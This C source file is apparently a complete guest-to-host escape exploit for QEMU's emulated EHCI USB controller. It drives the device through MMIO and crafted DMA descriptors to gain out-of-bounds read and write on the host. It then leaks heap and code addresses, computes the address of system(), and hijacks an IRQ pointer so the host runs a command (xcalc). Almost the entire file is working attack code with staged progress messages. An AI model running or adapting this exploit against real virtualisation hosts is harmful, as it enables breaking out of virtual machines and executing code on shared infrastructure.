#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdint.h>
#include <stdbool.h>

typedef struct USBDevice USBDevice;
typedef struct USBEndpoint USBEndpoint;
struct USBEndpoint {
    uint8_t nr;
    uint8_t pid;
    uint8_t type;
    uint8_t ifnum;
    int max_packet_size;
    int max_streams;
    bool pipeline;
    bool halted;
    USBDevice *dev;
    USBEndpoint *fd;
    USBEndpoint *bk;
};

struct USBDevice {
    int32_t remote_wakeup;
    int32_t setup_state;
    int32_t setup_len;
    int32_t setup_index;

    USBEndpoint ep_ctl;
    USBEndpoint ep_in[15];
    USBEndpoint ep_out[15];
};

typedef struct EHCIqh {
    uint32_t next;                    /* Standard next link pointer */

    /* endpoint characteristics */
    uint32_t epchar;

    /* endpoint capabilities */
    uint32_t epcap;

    uint32_t current_qtd;             /* Standard next link pointer */
    uint32_t next_qtd;                /* Standard next link pointer */
    uint32_t altnext_qtd;         

    uint32_t token;                   /* Same as QTD token */
    uint32_t bufptr[5];               /* Standard buffer pointer */

} EHCIqh;

typedef struct EHCIqtd {
    uint32_t next;                    /* Standard next link pointer */
    uint32_t altnext;                 /* Standard next link pointer */
    uint32_t token;
    uint32_t bufptr[5];               /* Standard buffer pointer */
} EHCIqtd;

char *setup_buf;
char *data_buf;
char *data_bufoob;
char *first_leak_data;
char *second_leak_data;

unsigned char* mmio_mem;
char *dmabuf;
uint32_t *entry;
struct EHCIqh *qh;
struct EHCIqtd * qtd;
uint64_t device_addr = 0;
uint64_t func_addr = 0;
uint64_t port_addr = 0;
uint64_t port_ptr = 0;
uint64_t data_buf_addr = 0;


size_t virtuak_addr_to_physical_addr(void *addr){
    uint64_t data;

    int fd = open("/proc/self/pagemap",O_RDONLY);
    if(!fd){
        perror("open pagemap");
        return 0;
    }

    size_t pagesize = getpagesize();
    size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

    if(lseek(fd,offset,SEEK_SET) < 0){
        puts("lseek");
        close(fd);
        return 0;
    }

    if(read(fd,&data,8) != 8){
        puts("read");
        close(fd);
        return 0;
    }

    if(!(data & (((uint64_t)1 << 63)))){
        puts("page");
        close(fd);
        return 0;
    }

    size_t pageframenum = data & ((1ull << 55) - 1);
    size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

    close(fd);

    return phyaddr;
}

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint64_t addr, uint64_t value)
{
    *((uint64_t*)(mmio_mem + addr)) = value;
}

uint64_t mmio_read(uint64_t addr)
{
    return *((uint64_t*)(mmio_mem + addr));
}

void echi_reset(void){
    mmio_write(0x20,1<<1);
    return;
}

void set_usbcmd(void){
    echi_reset();
    mmio_write(0x20,(1<<0)|(1<<4));
    return;
}

void set_portsc(void){
    mmio_write(0x64,1<<8);
    mmio_write(0x64,1<<2);
    mmio_write(0x65<<2,1<<8);
    mmio_write(0x65<<2,1<<2);
    mmio_write(0x66<<2,1<<8);
    mmio_write(0x66<<2,1<<2);
    mmio_write(0x67<<2,1<<8);
    mmio_write(0x67<<2,1<<2);
    mmio_write(0x68<<2,1<<8);
    mmio_write(0x68<<2,1<<2);
    mmio_write(0x69<<2,1<<8);
    mmio_write(0x69<<2,1<<2);
    return;
}

void set_length(uint64_t length){

    setup_buf[6] = length & 0xff;
    setup_buf[7] = (length >> 8) & 0xff;

    qtd->token = (8 << 16) | (1 << 7) | (2 << 8);
    qtd->bufptr[0] = virtuak_addr_to_physical_addr(setup_buf);

    qh->token = 1 << 7;
    qh->current_qtd = virtuak_addr_to_physical_addr(qtd);

    *entry = virtuak_addr_to_physical_addr(qh) + (1 << 1);

    set_usbcmd();
    set_portsc();
    mmio_write(0x34,virtuak_addr_to_physical_addr(dmabuf));

    sleep(3);
}

void perpare_read(void){

    setup_buf[0] = 0x80;
    setup_buf[6] = 0xff;
    setup_buf[7] = 0x00;

    qtd->token = (8 << 16) | (1 << 7) | (2 << 8);
    qtd->bufptr[0] = virtuak_addr_to_physical_addr(setup_buf);

    qh->token = 1 << 7;
    qh->current_qtd = virtuak_addr_to_physical_addr(qtd);

    *entry = virtuak_addr_to_physical_addr(qh) + (1 << 1);

    set_usbcmd();
    set_portsc();
    mmio_write(0x34,virtuak_addr_to_physical_addr(dmabuf));

    sleep(3);
}

void perpare_write(void){

    setup_buf[0] = 0x00;
    setup_buf[6] = 0xff;
    setup_buf[7] = 0x00;

    qtd->token = (8 << 16) | (1 << 7) | (2 << 8);
    qtd->bufptr[0] = virtuak_addr_to_physical_addr(setup_buf);

    qh->token = 1 << 7;
    qh->current_qtd = virtuak_addr_to_physical_addr(qtd);

    *entry = virtuak_addr_to_physical_addr(qh) + (1 << 1);

    set_usbcmd();
    set_portsc();
    mmio_write(0x34,virtuak_addr_to_physical_addr(dmabuf));

    sleep(3);
}

void oob_read(uint64_t length,int flag){
    if(flag){
        perpare_read();    
        set_length(length);
    }

    data_buf[0] = 'R';
    data_buf[1] = 'e';
    data_buf[2] = 's';
    data_buf[3] = 'e';
    data_buf[4] = 'r';
    data_buf[5] = 'y';

    qtd->token = (0x1e00 << 16) | (1 << 7) | (1 << 8);
    qtd->bufptr[0] = virtuak_addr_to_physical_addr(data_buf);
    qtd->bufptr[1] = virtuak_addr_to_physical_addr(data_bufoob);

    qh->token = 1 << 7;
    qh->current_qtd = virtuak_addr_to_physical_addr(qtd);

    *entry = virtuak_addr_to_physical_addr(qh) + (1 << 1);

    set_usbcmd();
    set_portsc();
    mmio_write(0x34,virtuak_addr_to_physical_addr(dmabuf));

    sleep(5);
}

void oob_write(uint64_t offset,uint64_t setup_len,uint64_t setup_index,int perpare){
    if(perpare){
        perpare_write();
        set_length(0x1010);
    }

    *(unsigned long *)(data_bufoob + offset) = 0x0000000200000002; // 覆盖成原先的内容
    *(unsigned int *)(data_bufoob + 0x8 +offset) = setup_len; //setup_len
    *(unsigned int *)(data_bufoob + 0xc+ offset) = setup_index;

    qtd->token = (0x1e00 << 16) | (1 << 7) | (0 << 8);
    qtd->bufptr[0] = virtuak_addr_to_physical_addr(data_buf);
    qtd->bufptr[1] = virtuak_addr_to_physical_addr(data_bufoob);

    qh->token = 1 << 7;
    qh->current_qtd = virtuak_addr_to_physical_addr(qtd);

    *entry = virtuak_addr_to_physical_addr(qh) + (1 << 1);

    set_usbcmd();
    set_portsc();
    mmio_write(0x34,virtuak_addr_to_physical_addr(dmabuf));

    sleep(5);
}

void anywhere_read(uint64_t target_addr){
    puts("\033[47;31m[*] Anywhere Read\033[0m");
    //set_length(0x1010);
    oob_write(0x0,0x1010,0xfffffff8-0x1010,1);

    *(unsigned long *)(data_buf) = 0x2000000000000080;

    uint32_t target_offset = target_addr - data_buf_addr;

    oob_write(0x8,0xffff,target_offset - 0x1018,0);
    oob_read(0x2000,0);
}

void anywhere_write(uint64_t target_addr,uint64_t payload,int flag){
    puts("\033[47;31m[*] Anywhere Write\033[0m");

    uint32_t offset = target_addr - data_buf_addr;

    oob_write(0, offset+0x8, offset-0x1010,1);

    if(flag){
        printf("\033[41;37m[*] Hacked!\033[0m\n");
    }

    *(unsigned long *)(data_buf) = payload;
    oob_write(0, 0xffff, 0,0);
}

void init(void){
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    dmabuf = mmap(0, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (dmabuf == MAP_FAILED)
        die("mmap");

    mlock(dmabuf, 0x3000);

    //printf("[*] mmio_mem : %p\n", mmio_mem);
    //printf("[*] dmabuf : %p\n",dmabuf);

    entry = dmabuf + 0x4;
    qh = dmabuf + 0x100;
    qtd = dmabuf + 0x200;
    setup_buf = dmabuf + 0x300;
    data_buf = dmabuf + 0x1000;
    data_bufoob = dmabuf + 0x2000;
    first_leak_data = dmabuf + 0x2000;
    second_leak_data = dmabuf + 0x1000;    
}

int main(){
    puts("\033[41;37m[*] Beginning\033[0m");
    puts("\033[47;31m[*] Wait a moment\033[0m");

    init();

    printf("\033[41;37m[*] Step 1/3\033[0m\n");

    oob_read(0x2000,1);
    device_addr = 0;

    for(int i=36;i<42;i++){
        uint64_t tmp = first_leak_data[i] & 0xff;
        device_addr |= tmp << ((i-36) * 8);
    }

    func_addr = 0;
    port_addr = device_addr+0x78;
    data_buf_addr = device_addr+0xdc;

    printf("\033[47;31m[*] Devices addr : 0x%lx\033[0m\n",device_addr);
    printf("\033[47;31m[*] Port addr : 0x%lx\033[0m\n",port_addr);
    printf("\033[47;31m[*] Data Buf addr : 0x%lx\033[0m\n",data_buf_addr);

    for(int i=0x4fc;i<0x4fc+6;i++){
        uint64_t tmp = first_leak_data[i] & 0xff;
        func_addr |= tmp << ((i-0x4fc) * 8);
    }

    printf("\033[47;31m[*] Func addr : 0x%lx\033[0m\n",func_addr);

    uint64_t system_addr = func_addr - 0xb5c860;

    printf("\033[47;31m[*] System addr : 0x%lx\033[0m\n",system_addr);

    sleep(3);

    printf("\033[41;37m[*] Step 2/3\033[0m\n");

    anywhere_read(port_addr);

    for(int i=0;i<6;i++){
        uint64_t tmp = second_leak_data[i] & 0xff;
        port_ptr |= tmp << ((i) * 8);
    }

    uint64_t EHCIState_addr = port_ptr - 0x540;
    uint64_t irq_addr = EHCIState_addr + 0xc0;
    uint64_t fake_irq_addr = data_buf_addr;
    uint64_t irq_ptr = 0;

    anywhere_read(irq_addr);

    for(int i=0;i<6;i++){
        uint64_t tmp = second_leak_data[i] & 0xff;
        irq_ptr |= tmp << ((i) * 8);
    }

    printf("\033[47;31m[*] Port ptr : 0x%lx\033[0m\n",port_ptr);
    printf("\033[47;31m[*] EHCIState addr : 0x%lx\033[0m\n",EHCIState_addr);
    printf("\033[47;31m[*] IRQ addr : 0x%lx\033[0m\n",irq_addr);
    printf("\033[47;31m[*] Fake IRQ addr : 0x%lx\033[0m\n",fake_irq_addr);
    printf("\033[47;31m[*] IRQ ptr : 0x%lx\033[0m\n",irq_ptr);

    *(unsigned long *)(data_buf + 0x28) = system_addr;
    *(unsigned long *)(data_buf + 0x30) = device_addr+0xdc+0x100;
    *(unsigned long *)(data_buf + 0x38) = 0x3;
    *(unsigned long *)(data_buf + 0x100) = 0x636c616378;

    printf("\033[41;37m[*] Step 3/3\033[0m\n");

    oob_write(0, 0xffff, 0xffff,1);

    anywhere_write(irq_addr, fake_irq_addr,1);

    return 0;
}
